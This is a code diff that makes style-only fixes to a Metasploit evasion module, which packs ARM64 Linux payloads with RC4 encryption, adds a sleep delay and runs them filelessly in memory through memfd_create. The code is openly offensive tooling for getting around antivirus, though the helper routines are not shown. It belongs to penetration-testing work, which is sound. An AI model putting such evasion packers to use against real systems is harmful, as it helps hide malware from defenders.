@@ -13,18 +13,18 @@ class MetasploitModule < Msf::Evasion
     super(
       update_info(
         info,
-        'Name'           => 'Linux RC4 Packer with In-Memory Execution',
-        'Description'    => %q{
+        'Name' => 'Linux RC4 Packer with In-Memory Execution',
+        'Description' => %q{
           This evasion module packs Linux payloads using RC4 encryption
           and executes them from memory using memfd_create for fileless execution.
           Linux kernel version support: 3.17+
         },
-        'Author'         => ['Massimo Bertocchi'],
-        'License'        => MSF_LICENSE,
-        'Platform'       => 'linux',
-        'Arch'           => [ARCH_AARCH64],
-        'Targets'        => [['Linux ARM64/AArch64', {}]],
-        'DefaultTarget'  => 0
+        'Author' => ['Massimo Bertocchi'],
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => [ARCH_AARCH64],
+        'Targets' => [['Linux ARM64/AArch64', {}]],
+        'DefaultTarget' => 0
       )
     )
 
@@ -35,17 +35,16 @@ class MetasploitModule < Msf::Evasion
   end
 
   def run
-    
     raw_payload = payload.encoded
-    unless raw_payload && raw_payload.length > 0
-      fail_with(Failure::BadConfig, "Failed to generate payload")
+    unless raw_payload && !raw_payload.empty?
+      fail_with(Failure::BadConfig, 'Failed to generate payload')
     end
-    
+
     elf_payload = Msf::Util::EXE.to_linux_aarch64_elf(framework, raw_payload)
-    complete_loader = sleep_evasion( seconds: datastore['SLEEP_TIME']) + rc4_decrypter(data: (in_memory_load(elf_payload) + elf_payload))
+    complete_loader = sleep_evasion(seconds: datastore['SLEEP_TIME']) + rc4_decrypter(data: (in_memory_load(elf_payload) + elf_payload))
     final_elf = Msf::Util::EXE.to_linux_aarch64_elf(framework, complete_loader)
 
     File.binwrite(datastore['FILENAME'], final_elf)
-    File.chmod(0755, datastore['FILENAME'])
+    File.chmod(0o755, datastore['FILENAME'])
   end
 end
